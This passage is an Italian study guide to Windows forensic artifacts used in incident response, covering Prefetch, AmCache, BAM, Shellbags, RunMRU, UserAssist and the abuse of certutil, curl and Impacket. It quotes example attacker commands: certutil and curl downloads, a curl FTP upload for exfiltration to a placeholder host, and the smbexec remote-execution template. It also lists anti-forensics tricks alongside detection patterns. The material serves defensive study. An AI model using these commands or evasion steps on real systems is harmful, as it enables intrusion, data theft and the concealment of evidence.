# Guide forensi agli artefatti Windows — documento di studio

30 settembre 2026 · Davide Numelli

Le 32 voci del post «Windows Artifact Forensics Guides – The Master List» di Cyber Triage (10 settembre 2026) sono qui rielaborate in italiano, nell'ordine e nelle sei sezioni del post. Ogni scheda dice dove si trova l'artefatto, cosa prova e cosa no, come può essere eluso e con quali strumenti si analizza; la fonte è in fondo a ciascuna scheda.

ShimCache e AmCache rimandano alla stessa guida e sono trattati insieme. Per Certutil.exe e per le Jump Lists Cyber Triage ha due articoli collegati, integrati nella stessa scheda. Sette voci (Prefetch, BAM/DAM, browser, $MFT, Volume Shadow Copies, Cestino, event log) rimandano a siti esterni a Cyber Triage.

## 1. Artefatti di esecuzione

Queste 13 schede rispondono a «che cosa è stato eseguito, quando e da chi». Nessun artefatto basta da solo: ognuno vede solo una parte delle esecuzioni, quindi vanno incrociati (confronto rapido nell'Appendice A).

### 1.1 Prefetch

Prefetch è la prova di esecuzione più diretta sui client Windows: un file `.pf` per ogni programma avviato, con le ultime 8 esecuzioni e i file toccati nei primi secondi.

- **Dove:** `C:\Windows\Prefetch\`, file `.pf` compressi (serve un parser). Da Windows 8 in poi al massimo 1024 file.
- **Nome:** `PROGRAMMA.EXE-HASH.pf`. L'hash deriva dalla cartella da cui il programma è partito, non dal contenuto del file: due `.pf` per lo stesso eseguibile significano due percorsi di lancio diversi.
- **Contenuto:** circa 10 secondi di attività dopo l'avvio (DLL, file e cartelle usati, informazioni sul volume), il contatore delle esecuzioni e le date delle ultime 8.
- **Prova:** che il programma è stato eseguito, quando (ultime 8 volte) e che cosa ha aperto all'avvio.
- **Non prova:** chi l'ha lanciato (il file non contiene l'utente) né le esecuzioni oltre le ultime 8.
- **Anti-forensics:** i `.pf` si cancellano facilmente; la loro assenza o cancellazione è già un indizio.

| Caso della guida | Cosa ha rivelato il `.pf` |
| --- | --- |
| Eseguibile sospetto `evil.exe` | I file con cui ha interagito all'avvio, cioè gli altri componenti del malware |
| PowerShell che lancia uno script | Il riferimento a `notevil.ps1` e ai comandi di ricognizione `ipconfig`, `netstat`, `arp`, `whoami` |
| SDelete (cancellazione sicura) | I nomi dei file distrutti (`evil.exe.exe`, `Notevil.ps1`), altrimenti irrecuperabili |

**Strumento:** PECmd di Eric Zimmerman.

```
PECmd.exe -f "C:\Windows\Prefetch\<FILE>.pf"
PECmd.exe -d "C:\Windows\Prefetch" --csv <cartella_output> --csvf output.csv
```

**Da sapere (fonti integrative):** il Prefetch è disattivato di default sui Windows Server, come ricorda anche la guida della scheda 1.2. Fino a Windows 7 i file erano al massimo 128. Il `.pf` viene scritto circa 10 secondi dopo l'avvio, e la sua data di creazione approssima la prima esecuzione solo se il file non è stato ricreato ([SANS ISC](https://isc.sans.edu/diary/29168)).

*Fonte:* [Artifacts of Execution: Prefetch – Part One](https://www.thedfirspot.com/post/artifacts-of-execution-i-know-what-you-did-last-incident), The DFIR Spot (thatdfirdude), 9 ottobre 2023.

### 1.2 ShimCache e AmCache

ShimCache e AmCache nascono dall'infrastruttura di compatibilità applicativa (shim) di Windows e provano soprattutto che un file è esistito in un certo percorso; come prova di esecuzione vanno usati con cautela. Il loro vantaggio: esistono di default su tutti i sistemi moderni, a differenza del Prefetch (spento sui server) e dell'audit dei processi (spento di default).

| Cosa provano | ShimCache | AmCache |
| --- | --- | --- |
| Esistenza del file nel percorso registrato | Sì, per ogni voce | Sì, per ogni voce |
| Esecuzione | Solo in certi casi (vedi sotto) | Non usarlo come prova di esecuzione |
| Installazione di applicazioni e driver | No | Sì |

#### AmCache

- **Dove:** `C:\Windows\AppCompat\Programs\Amcache.hve`, un file in formato hive (REGF) che non fa parte del registro caricato. Sui sistemi vecchi (in genere fino a Windows 7; conta la versione 6.1.x delle librerie di compatibilità, non quella del sistema) c'è invece `RecentFileCache.bcf`.
- **Utile per:** provare che un file è esistito anche dopo la cancellazione; ricostruire le applicazioni installate e il metodo di installazione; avere lo SHA1 di eseguibili e driver cancellati per verificarne la reputazione; leggere i metadati PE (dimensione, CompanyName, versione).
- **Limiti:** lo SHA1 copre solo i primi 30 MB del file; niente argomenti, utente o orari di esecuzione; lo schema cambia tra versioni ed è complesso.

| Chiave AmCache | Contenuto | Campi utili |
| --- | --- | --- |
| `InventoryApplicationFile` | File eseguiti che richiedevano uno shim, eseguibili trovati nelle cartelle scansionate, file installati da un'applicazione | `FileId` (SHA1 dei primi 30 MB), `LowerCaseLongPath`, `Size`, `BinaryType` (32/64 bit), `ProgramId`, dati PE (`OriginalName`, `ProductName`, `BinFileVersion`, `BinProductVersion`, `LinkDate`) |
| `InventoryApplication` | Programmi installati e disinstallati | `ProgramId`, `Source` (MSI; AppxPackage = MSIX/Store; AddRemoveProgram = installer .exe), `Publisher` (dal certificato di firma), `RootDirPath`, `Name`, `Version` |
| `InventoryApplicationShortcut` | File `.lnk` trovati dalle scansioni periodiche del Microsoft Compatibility Appraiser (es. `C:\Users\*\Desktop`, menu Start): non indicano esecuzione | `ShortcutPath`, `ShortcutTargetPath` |
| `InventoryDriverBinary` | Driver installati | Nome della chiave = percorso, `DriverId` (SHA1), `DriverSigned` (1 = firmato), `DriverIsKernelMode` (1 = kernel), `Service`, `Product`, `DriverLastWriteTime` |

#### ShimCache (AppCompatCache)

- **Dove:** nell'hive SYSTEM, `SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache` (valore `AppCompatCache`) da Vista in poi; su XP `...\Session Manager\AppCompatibility\AppCompatCache`. La cache vive in memoria e viene scritta nel registro solo allo spegnimento o al riavvio regolare; Volatility3 (plugin `shimcachemem`) la legge dalla memoria.
- **Contenuto:** percorso completo del file, data di ultima modifica del file, posizione nella cache (numero più basso = voce più recente).
- **Utile per:** triage dei file di interesse; provare l'esistenza di eseguibili anche su percorsi UNC e chiavette USB; trovare file comparsi nello stesso momento (voci vicine nella cache); intuire file spostati o rinominati (stessa data di modifica, percorso nuovo).
- **Limiti:** al massimo 1024 voci (XP 96, Server 2003 512); nessuna data di esecuzione, contatore, utente o argomento; da Windows 10 non prova l'esecuzione. AppCompatCacheParser di Eric Zimmerman legge gli ultimi 4 byte della voce: se valgono 1 l'esecuzione è molto probabile, ma non va usata da sola come prova.

| Confronto | AmCache | ShimCache |
| --- | --- | --- |
| Quando si aggiorna | Subito (parte dei dati nei transaction log) | Allo spegnimento o al riavvio |
| Dati | Ricchi: SHA1, percorso, dati PE, installazioni | Essenziali: percorso, data di modifica, dimensione |
| Limite principale | Non registra tutti i PE; schema che cambia tra versioni | Capienza limitata; vede solo fino all'ultimo spegnimento |

**Strumenti:** AmcacheParser e AppCompatCacheParser (Eric Zimmerman), RegRipper4 (plugin `amcache`), Registry Explorer (plugin AmCache), Volatility3. Cyber Triage trasforma le voci ShimCache che indicano esecuzione in processi e le mette in timeline per verificarle.

La guida segnala altri artefatti di compatibilità da conoscere: i log Application Experience del Program Compatibility Assistant (PCA) e il nuovo artefatto di esecuzione PCA di Windows 11 22H2.

*Fonte:* [ShimCache and AmCache Forensic Analysis 2026](https://www.cybertriage.com/blog/shimcache-and-amcache-forensic-analysis-2026/), Cyber Triage (Chris Ray), 2 maggio 2025, aggiornata 24 marzo 2026.

### 1.3 BAM/DAM

BAM registra, per ogni utente, il percorso degli eseguibili avviati e l'ora dell'ultima esecuzione, ma solo per circa una settimana.

- **Cosa sono:** BAM (Background Activity Moderator, driver `bam.sys`) regola l'attività in background delle applicazioni per risparmiare energia; esiste da Windows 10 1709 ed è ancora in Windows 11. DAM (Desktop Activity Moderator) fa lo stesso per le app desktop ed è legato al Modern Standby: su desktop, macchine virtuali e server la sua chiave è spesso vuota.
- **Dove:** una sottochiave per ogni SID utente:
  - `HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\<SID>`
  - `HKLM\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings\<SID>`
  - nelle prime versioni di Windows 10 manca il segmento `State`.
- **Contenuto:** ogni valore ha come nome il percorso completo dell'eseguibile e come dato l'ora dell'ultima esecuzione (un FILETIME in binario, da convertire). I percorsi sono in formato dispositivo, per esempio `\Device\HarddiskVolume3\...` ([Forensafe](https://forensafe.com/blogs/bam.html)).
- **Prova:** quale eseguibile è stato lanciato, quando l'ultima volta e da quale utente (SID). Sul sistema live il SID dell'utente corrente si ottiene con `whoami /user`.
- **Limiti:**
  - non registra eseguibili avviati da supporti rimovibili, da condivisioni di rete o in esecuzione remota;
  - l'orario può scostarsi di alcuni minuti da quello reale;
  - all'avvio di Windows vengono eliminate le voci più vecchie di 7 giorni;
  - se l'eseguibile viene cancellato la voce resta fino al riavvio successivo, poi sparisce.
- **Analisi con Registry Explorer:** avviarlo come amministratore, *File → Live System* (oppure caricare l'hive SYSTEM di un'immagine), aprire `SYSTEM`, andare a `...\bam\State\UserSettings`, scegliere il SID ed esportare.
- **Da incrociare con:** Prefetch, UserAssist, ShimCache e AmCache.

*Fonte:* [Forensic Windows Part 5: Analyzing BAM and DAM](https://www.it-connect.tech/forensic-windows-part-5-analyzing-bam-and-dam/), IT-Connect (Mehdi Dakhama), 17 luglio 2026.

### 1.4 Certutil.exe

`certutil.exe` gestisce i certificati di Windows, ma viene abusato per scaricare file (MITRE T1105, Ingress Tool Transfer) e lascia una traccia specifica: la cache CryptnetUrlCache, che conserva una copia del file e l'URL di origine.

**Come viene abusato**

- Download con `-urlcache`: `certutil.exe -urlcache -split -f http://<host>/file.zip [nome]` salva con il nome presente nell'URL o con quello indicato, anche dentro un Alternate Data Stream (es. `legitfile.txt:rtkit`).
- Download con `-verifyctl`: `certutil.exe -verifyctl -f http://<host>/file.exe` salva un file `.bin` il cui nome è lo SHA1 e mostra errori di verifica, normali in questo caso.
- Entrambi scrivono nella cartella di lavoro corrente.
- Altri usi malevoli: codifica e decodifica base64, scrittura in ADS, installazione di certificati non autorizzati (`certutil.exe -addstore -f -user <utente> cert.der`).
- Non servono privilegi di amministratore; servono invece per disattivare Defender, cosa che l'attaccante può fare prima del download.

**Artefatti**

| Artefatto | Dove | Cosa dice |
| --- | --- | --- |
| Creazione del processo | Security 4688 (con audit e riga di comando attivi), EDR | Comando completo e utente |
| Prefetch | `C:\Windows\Prefetch` | Esecuzione, senza argomenti |
| Defender | Windows Defender/Operational, evento 1116 | Download bloccato dalla protezione in tempo reale |
| CryptnetUrlCache, Content | `C:\Users\*\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\` | Copia del file scaricato, anche se l'originale è stato cancellato |
| CryptnetUrlCache, MetaData | `C:\Users\*\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\` | URL di origine e orari |

- Per l'account SYSTEM le stesse cartelle sono sotto `C:\Windows\*\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\`.
- I file in Content e MetaData hanno per nome l'MD5 dell'URL codificato in UTF-16LE.
- Certutil **non** crea lo stream `Zone.Identifier`: non ci si può basare su quello per trovare i file scaricati.
- Un eseguibile in `CryptnetUrlCache\Content` è anomalo: normalmente la cartella contiene CRL e risposte OCSP.

**Passi dell'indagine**

1. Confermare l'intento: argomenti noti come malevoli; reputazione di IP e dominio; certutil dovrebbe contattare solo autorità di certificazione note (elenco CCADB); altri usi di certutil nel perimetro; chiedere all'utente.
2. Verificare l'esito: cercare il file scaricato (nome predefinito = nome d'origine; attenzione agli ADS e alla cartella di lavoro) e i log di Defender (evento 1116).
3. Identificare l'account: profilo in cui si trova la CryptnetUrlCache, utente dell'evento 4688, proprietario del file.
4. Analizzare il file: recuperarlo dalla cache se cancellato, controllare l'hash, scansionarlo, eseguirlo in sandbox, aprire gli archivi.
5. Cercare altri host colpiti: log di firewall, proxy, DNS ed EDR, cache DNS, connessioni attive, argomenti dei processi.
6. Rivedere tutta l'attività dell'account per capire come l'attaccante è entrato e cosa ha fatto.

**Strumento citato:** CryptnetURLCacheParser (AbdulRhman Alfaifi).

*Fonti:* [DFIR Next Steps: What to Do After You Find a Suspicious Use of Certutil.exe](https://www.cybertriage.com/dfir-next-steps/dfir-next-steps-what-to-do-after-you-find-a-suspicious-use-of-certutil-exe/), Cyber Triage (Mike Wilkinson), 7 agosto 2024, aggiornata 8 giugno 2026; [DFIR Breakdown: Using Certutil to Download Attack Tools](https://www.cybertriage.com/blog/dfir-breakdown-using-certutil-to-download-attack-tools/), Cyber Triage (Chris Ray), 24 luglio 2024, aggiornata 8 giugno 2026.

### 1.5 Curl.exe

`curl.exe` è incluso in Windows dalla build 17063 di Windows 10 (dicembre 2017): firmato e ignorato dagli antivirus, scarica ed esfiltra file su decine di protocolli senza lasciare una cronologia propria.

- **Protocolli:** tra gli altri HTTP/HTTPS, FTP/FTPS, SCP/SFTP, SMB/SMBS, SMTP, IMAP, POP3, LDAP, TFTP, TELNET, WebSocket.
- **Cosa non lascia:** nessuna cronologia, nessuna voce nella cronologia di Edge, nessuno stream `Zone.Identifier` sui file scaricati.
- **Usi tipici:**
  - `curl -o rootkit.zip https://<sito>/rootkit.zip` (download con nome di output)
  - `curl https://<sito>/rootkit.zip > rootkit.zip` (redirezione)
  - `curl -u <utente>:<password> -T segreto.zip ftp://<ip>/uploads/` (upload, cioè esfiltrazione)

**Segnali sospetti negli argomenti** (nessun argomento è malevolo di per sé)

- Percorsi assoluti, tipici di chi non conosce la cartella di lavoro (es. `-o \users\Public\Documents\office.zip`).
- Variabili d'ambiente verso cartelle scrivibili (es. `-o %temp%/tools.zip`).
- Estensione che cambia tra URL e file salvato (es. `office.html` salvato come `office.zip`).
- Tutto insieme: salvare un `svchost.exe` scaricato da una pagina `.html` nella cartella Esecuzione automatica, usando il nome 8.3 `STARTM~1` per evitare gli spazi.

**Passi dell'indagine**

1. Confermare: reputazione di IP e dominio; uso abituale di curl nell'ambiente (ricerca su tutti gli host, domande all'utente).
2. Esito: il file scaricato deve esistere (nome dagli argomenti; ricerca per nome se il percorso non è assoluto; proprietario del file; attività successive come l'estrazione con `tar.exe`). Curl viene bloccato di rado, il payload scaricato più spesso: controllare i log di Defender.
3. Contesto MITRE: T1105 per il download (tattica TA0011, Command and Control); T1020, T1048, T1011, T1567 e T1537 per l'esfiltrazione. Il download può avvenire in qualsiasi fase, l'esfiltrazione di solito verso la fine.
4. Accesso richiesto: basta un utente con permessi sui file; cartelle scrivibili tipiche sono la `%TEMP%` dell'utente e `C:\Users\Public\Downloads`. L'uso da parte di un amministratore locale è un ulteriore campanello d'allarme.
5. Account: utente negli event log Security, proprietario del file scaricato, utenti connessi in quel momento; poi verificare eventuali sessioni RDP di quell'utente.
6. Host remoto: è nell'URL. Altri host colpiti: log di firewall, proxy, EDR e DNS, cache DNS, connessioni attive, argomenti dei processi.
7. File scaricato: hash e reputazione, scansione multi-motore, estrazione degli archivi, sandbox.

*Fonte:* [DFIR Next Steps: What to Do After You Find a Suspicious Use of Curl.exe](https://www.cybertriage.com/blog/dfir-next-steps-what-to-do-after-you-find-a-suspicious-use-of-curl-exe/), Cyber Triage (Mike Wilkinson), 19 agosto 2024, aggiornata 8 giugno 2026.

### 1.6 Impacket atexec

`atexec.py` di Impacket esegue comandi da remoto creando, avviando e cancellando in pochi millisecondi un'attività pianificata: la prova migliore sta negli event log, soprattutto nel 4698 che contiene l'XML dell'attività.

**Come funziona (senza opzioni)**

1. Crea via RPC (`SchRpcRegisterTask`) un'attività con nome casuale di 8 lettere nella cartella radice delle attività.
2. La avvia (`SchRpcRun`) come SYSTEM, avvolgendo il comando in cmd.exe con l'output rediretto su un `.tmp` casuale, per esempio `cmd.exe /C whoami > C:\Windows\Temp\BwBxpEDt.tmp 2>&1`.
3. Cancella l'attività (`SchRpcDelete`).
4. Legge l'output del `.tmp` tramite la condivisione `ADMIN$`, poi cancella il `.tmp`.

- `-SilentCommand`: niente cmd.exe, niente output, quindi niente `.tmp` né accesso ad `ADMIN$`.
- `-session-id <N>`: niente cmd.exe; il comando gira come l'utente di quella sessione invece che come SYSTEM.
- Il nome utente passato ad atexec serve solo ad autenticarsi, non è il contesto di esecuzione.
- Gli attaccanti usano versioni compilate (PyInstaller, Auto PY to EXE) per evitare le dipendenze Python. Uso documentato da APT10 e Lancefly; Red Canary nel 2023 e nel 2024 ha indicato Impacket come la seconda minaccia più diffusa tra i propri clienti.

**Artefatti**

| Log | Evento | Cosa dice | Requisito |
| --- | --- | --- | --- |
| Security | 4698, attività creata | Utente, ora, XML completo dell'attività | Audit Other Object Access Events |
| Security | 4699, attività cancellata | Ora della cancellazione | Come sopra |
| Security | 4688, processo creato | Utente e riga di comando completa | Audit Process Creation + riga di comando |
| Security | 5145, accesso dettagliato a share | `IPC$` con target `atsvc`; `ADMIN$` sul `.tmp`; IP sorgente | Audit Detailed File Share (molto rumoroso) |
| TaskScheduler/Operational | 106, 129, 100, 141 | Registrazione, processo creato (eseguibile e PID), avvio (utente), cancellazione | Cronologia delle attività attivata |

Il PID dell'evento 129 si collega al 4688 (convertendolo in esadecimale) per recuperare gli argomenti completi.

**Sei regole di rilevamento** (valide per lo script non modificato)

| # | Indicatore | Fonte | Affidabilità |
| --- | --- | --- | --- |
| 1 | `<StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>` nell'XML: data scritta nel codice di atexec | 4698 | Molto alta |
| 2 | Azione `cmd.exe` con argomenti che finiscono in `> %windir%\Temp\[a-zA-Z]{8}.tmp 2>&1` (nell'XML con `&gt;` e `&amp;`) | 4698 | Alta |
| 3 | Nome dell'attività `[a-zA-Z]{8}` nella cartella radice | 4698, 4699, 106, 141 | Media |
| 4 | Attività creata e cancellata entro 500 ms (vale per ogni esecuzione remota tramite attività temporanee) | Eventi delle attività | Media |
| 5 | `cmd.exe` con argomenti che finiscono in `[a-zA-Z]{8}.tmp 2>&1` | 4688 | Alta |
| 6 | Accesso a `windows\temp\[a-zA-Z]{8}.tmp` tramite `ADMIN$` | 5145 | Media |

Ogni regola si aggira modificando lo script (data, schema del comando, nomi, pause) o con `-SilentCommand` e `-session-id`: conviene combinarle. Ordine di ricerca consigliato: 4698 (regole 1 e 2), poi 4688 (regola 5), poi i tempi tra creazione e cancellazione (4), i nomi (3) e il 5145 (6). MITRE: S0357 (Impacket), T1053.005.

*Fonte:* [DFIR Breakdown: Impacket Remote Execution Activity – Atexec](https://www.cybertriage.com/blog/dfir-breakdown-impacket-remote-execution-activity-atexec/), Cyber Triage (Chris Ray), 29 agosto 2024, aggiornata 2 aprile 2026.

### 1.7 Impacket smbexec

`smbexec.py` esegue ogni comando creando e cancellando un servizio Windows che gira come SYSTEM: il log System lo registra di default con l'evento 7045, e cmd.exe usato come servizio genera anche l'evento 7009.

**Come funziona (senza opzioni)**

1. Con credenziali valide (password o hash) crea via RPC (`RCreateService`) un servizio con nome casuale di 8 lettere, account `NT AUTHORITY\SYSTEM` e un percorso di questo tipo:

```
%COMSPEC% /Q /c echo <comando> ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\<8lettere>.bat & %COMSPEC% /Q /c %SYSTEMROOT%\<8lettere>.bat & del %SYSTEMROOT%\<8lettere>.bat
```

2. Avvia il servizio (`RStartService`): il comando viene scritto in un `.bat`, eseguito e cancellato.
3. Cancella il servizio (`RDeleteService`), legge `C:\__output` tramite la share `C$` e lo cancella.
4. Ripete tutto per ogni comando della shell «semi-interattiva». Il primo comando di ogni connessione è sempre `cd`.

Opzioni: `-service-name` (nome scelto dall'attaccante), `-share` (share diversa da `C$`), `-mode SERVER` (l'output va a un server SMB sulla macchina dell'attaccante), `-shell-type powershell` (comandi in PowerShell codificato; il `cd` iniziale no).

**Versioni dello script** (utili per datare gli artefatti)

| Data | Modifica |
| --- | --- |
| 24 maggio 2023 | Nome del servizio da `BTOBTO` a 8 lettere casuali |
| 27 aprile 2023 | Percorso UNC da `\\127.0.0.1\` a `\\%COMPUTERNAME%\` |
| 23 febbraio 2023 | Batch da `%TEMP%\execute.bat` a nome casuale in `%SYSTEMROOT%` |
| 15 marzo 2021 | Aggiunta l'opzione `-shell-type` (PowerShell) |
| 7 gennaio 2020 | Aggiunta l'opzione `-service-name` |
| 7 agosto 2017 | Avvio del servizio da automatico a manuale |
| 7 maggio 2016 | Output da `C:\Windows\Temp\__output` a `\\127.0.0.1\C$\__output` |
| 29 aprile 2013 | Prima versione |

Gruppi che lo usano: Cinnamon Tempest e FIN8 (MITRE ATT&CK), e le operazioni Bronze Starlight, Emperor Dragonfly e Operation Wocao.

**Artefatti**

| Log | Evento | Cosa dice | Note |
| --- | --- | --- | --- |
| System | 7045, servizio installato | Nome, percorso con argomenti, account; il creatore come SID nella sezione System | Registrato di default, da Windows 7 |
| System | 7009, timeout del servizio | cmd.exe non risponde al Service Control Manager | Forte indizio di abuso dei servizi |
| Security | 4697, servizio installato | Come il 7045, con l'utente creatore nei dettagli | Audit Security System Extension; solo da Windows 10 e Server 2016 |
| Security | 4688, processo creato | Riga di comando senza caratteri di escape, processo padre `services.exe` | Audit dei processi + riga di comando |
| Security | 5145, accesso a share | `IPC$` con target `svcctl`; `C$` con target `__output`; IP sorgente | Molto rumoroso |

Di supporto: il `$UsnJrnl` mostra la creazione e cancellazione ripetuta di `__output` (orari dei comandi, non il loro contenuto) e il Prefetch aiuta a collegare i momenti.

**Sei regole di rilevamento**

1. Output: `\__output 2^>^&1 >` negli eventi di servizio (7045, 4697), `\__output 2>&1 >` nel 4688.
2. Lo stesso batch citato tre volte nella riga di comando: `execute.bat` (vecchie versioni) o `[a-zA-Z]{8}.bat`.
3. Nome del servizio `BTOBTO` o `[a-zA-Z]{8}` (7045, 4697).
4. `/Q /c echo cd >`: segna l'inizio di una connessione.
5. 5145 con target `__output` (non esclusivo di smbexec: altri script Impacket usano lo stesso nome).
6. Servizio il cui binario è `cmd.exe`, `%COMSPEC%`, `powershell.exe` o `pwsh.exe` (oppure 4688 con padre `services.exe`): regola generica per l'esecuzione tramite servizi.

Priorità delle fonti: 7045, poi 4697, poi 4688. Attenzione all'escape: negli eventi di servizio i caratteri di redirezione sono preceduti da `^`, nel 4688 no.

*Fonte:* [DFIR Breakdown: Impacket Remote Execution Activity – Smbexec](https://www.cybertriage.com/blog/dfir-breakdown-impacket-remote-execution-activity-smbexec/), Cyber Triage (Chris Ray), 20 settembre 2024, aggiornata 14 gennaio 2026.

### 1.8 Shellbags

Le Shellbags ricordano come l'utente visualizza ogni cartella in Esplora risorse e nelle finestre Apri/Salva: per questo conservano il percorso completo delle cartelle aperte, anche se in seguito cancellate.

- **Cosa memorizzano:** per ogni cartella, posizione e dimensione della finestra, colonne, ordinamento, dimensione delle icone.
- **Dove (Vista e successivi):**
  - cartelle di rete (UNC): `NTUSER.DAT\Software\Microsoft\Windows\Shell` (live: `HKCU\Software\Microsoft\Windows\Shell`);
  - cartelle locali e rimovibili: `UsrClass.dat\Local Settings\Software\Microsoft\Windows\Shell` (live: `HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell`);
  - app MSIX: `User.dat` (rete) e `UserClasses.dat` (locale) in `C:\Users\<utente>\AppData\Local\Packages\<pacchetto>\SystemAppData\Helium\`;
  - XP: `ShellNoRoam` (locale) e `Shell` (rete) in NTUSER.DAT.
- **Quando nascono:** navigando cartelle o archivi (es. `.zip`) in Esplora risorse o nelle finestre Apri/Salva. Le app Windows (MSIX) che usano Apri/Salva scrivono nei propri hive.

| Chiave | Contenuto |
| --- | --- |
| `BagMRU` | La chiave che conta: valori numerati (0, 1, 2…) con gli shell item della cartella, `MRUListEx` con l'ordine di accesso, `NodeSlot` che rimanda alla sottochiave di `Bags` |
| `Bags` | Le preferenze di visualizzazione: il numero della sottochiave corrisponde a `NodeSlot`; `Shell` = Esplora risorse, `ComDlg` = finestra Apri/Salva |

**Come si interpretano**

- Viene registrata ogni cartella del percorso fino a quella aperta, anche se l'utente non ha visitato le intermedie: le cartelle senza `NodeSlot` non sono state aperte direttamente.
- Solo la presenza di preferenze di visualizzazione conferma che la cartella è stata davvero vista; una cartella negata per permessi non ne ha.
- Le date MAC della cartella sono salvate solo nella prima voce; primo e ultimo accesso si deducono dal last write delle chiavi, con poca precisione.
- Registrano cartelle, non file; solo l'attività da Esplora risorse e Apri/Salva; il comportamento cambia tra versioni di Windows.

**Anti-forensics**

- Negare la scrittura: un ACL Deny `SetValue` per Everyone su `BagMRU` impedisce la registrazione (va applicato a ogni posizione e per ogni utente).
- Evitare la GUI: navigare con PowerShell o cmd, oppure dal browser con `file://c:` (meglio in una finestra privata, per non lasciare cronologia).

**Strumenti:** ShellBags Explorer (interfaccia grafica) e SBECmd (riga di comando) di Eric Zimmerman; leggono hive offline oppure il registro live (con diritti di amministratore).

*Fonte:* [Shellbags Forensic Analysis 2026](https://www.cybertriage.com/blog/shellbags-forensic-analysis-2026/), Cyber Triage (Chris Ray), 21 marzo 2025, aggiornata 24 marzo 2026.

### 1.9 RunMRU

RunMRU conserva gli ultimi 26 comandi digitati da un utente nella finestra Esegui (Win+R), nell'ordine d'uso, ma con un solo orario: quello dell'ultimo comando.

- **Dove:** `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` (live: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`).
- **Struttura:** i comandi stanno nei valori da `a` a `z`; il valore `MRUList` dà l'ordine, con il più recente a sinistra.
- **Aggiornamento:**
  - registra solo comandi validi (un file inesistente non viene salvato);
  - un comando nuovo prende una lettera libera; uno ripetuto riusa la sua lettera e sale in `MRUList`;
  - al 27° comando diverso viene sovrascritto quello usato meno di recente.
- **Modi di aprire Esegui** (tutti chiamano la stessa funzione di `shell32.dll`): Win+R; ricerca nel menu Start; Task Manager → Esegui nuova attività; `shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}`; `rundll32.exe shell32.dll,#61`; le API `Shell.FileRun()` e `IShellDispatch.FileRun()`.
- **Prova:** utente, testo completo del comando così come digitato, sequenza. Se il comando è il percorso di un documento indica un accesso, non un'esecuzione: controllare quale applicazione è associata a quel tipo di file.
- **Limiti:** solo 26 voci; solo la finestra Esegui (non cmd, PowerShell, Utilità di pianificazione o processi creati da programmi); un solo orario, il last write della chiave.
- **Quando è decisivo:** minacce interne (amministratori che usano spesso Esegui) e ingegneria sociale: falsi supporti tecnici che fanno scaricare strumenti RMM e finte CAPTCHA (tecnica ClickFix) che fanno incollare in Esegui un comando malevolo, per esempio per installare l'infostealer Lumma.

**Quando manca**

- Tracciamento disattivato con l'impostazione di privacy «Let Windows improve Start and search results by tracking app launches»: `Start_TrackProgs` passa a 0, la chiave RunMRU viene cancellata e non si registra più nulla.
- ACL Deny sulla chiave: Explorer prova a scrivere ma riceve «Accesso negato».
- Cronologia cancellata (chiave intera o singoli valori), un utente alla volta.

*Fonte:* [How to Investigate RunMRU 2026](https://www.cybertriage.com/blog/how-to-investigate-runmru-2026/), Cyber Triage (Chris Ray), 9 marzo 2025, aggiornata 24 marzo 2026.

### 1.10 UserAssist

UserAssist registra, per ogni utente, i programmi e i collegamenti avviati dall'interfaccia grafica, con contatore e data dell'ultima esecuzione; da Windows 10, però, alcune voci compaiono senza che nulla sia stato eseguito.

- **Dove:** `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count` (live: sotto `HKCU`). Lo scopo originale è suggerire le app più usate nel menu Start.
- **GUID da conoscere:** `{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}` = eseguibili; `{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}` = collegamenti `.lnk`.
- **Nomi dei valori:** percorsi codificati ROT13 (solo le lettere ruotano di 13 posizioni: `rundll32.exe` diventa `ehaqyy32.rkr`). Le app dello Store compaiono con il nome di famiglia del pacchetto (es. `Microsoft.WindowsNotepad_8wekyb3d8bbwe!App`); alcuni percorsi iniziano con il GUID di una cartella nota (KnownFolderID).

| Byte del dato | Campo |
| --- | --- |
| 4–7 | Numero di esecuzioni |
| 8–11 | Numero di volte in primo piano (focus count) |
| 12–15 | Tempo totale in primo piano, in millisecondi (focus time) |
| 60–67 | Ultima esecuzione (FILETIME) |

**Quando si aggiorna**

- Serve una sessione interattiva dell'utente.
- Avvio dalla GUI (desktop, barra delle applicazioni, Esplora risorse, Esegui, Start e ricerca): voce sotto il GUID degli eseguibili, con contatore e ultima esecuzione.
- Avvio di un `.lnk`: voci sotto entrambi i GUID.
- Apertura di un documento dalla GUI: viene registrata l'applicazione associata (es. Notepad per un `.txt`).
- Programma con GUI avviato da riga di comando: cambiano solo focus count e focus time, non contatore né data.
- Utente diverso: se User1 apre un prompt come Admin e lancia uno strumento grafico, la voce finisce nell'UserAssist di User1.
- Falso positivo da Windows 10: «Apri percorso file» dal menu Start o dalla ricerca crea una voce con contatore e data aggiornati anche se nulla è stato eseguito.
- Nessuna voce (salvo il focus dei programmi con GUI) per: avvii da PowerShell o cmd, percorso digitato nella barra di Esplora risorse, API `CreateProcess` e `ShellExecute`, «Apri percorso file» dal menu contestuale o dalle proprietà.

**Limiti:** nessun argomento; solo l'ultima data e il totale; copre solo avvii dalla GUI e programmi con GUI. Manca se il tracciamento è disattivato (impostazione di privacy sugli avvii delle app oppure ACL Deny sulla chiave), se è stato cancellato (utente per utente) e per gli strumenti a riga di comando come `whoami` o `ping`. Va incrociato con Prefetch, Jump Lists, event log e SRUM.

**Strumenti:** Registry Explorer (plugin UserAssist), RegRipper4 (plugin `userassist` e un plugin che verifica se è disattivato), Autopsy, NirSoft UserAssistView, Plaso, Cyber Triage.

*Fonte:* [UserAssist Forensics 2026](https://www.cybertriage.com/blog/userassist-forensics-2026/), Cyber Triage (Chris Ray), 9 aprile 2025, aggiornata 24 marzo 2026.

### 1.11 MUICache

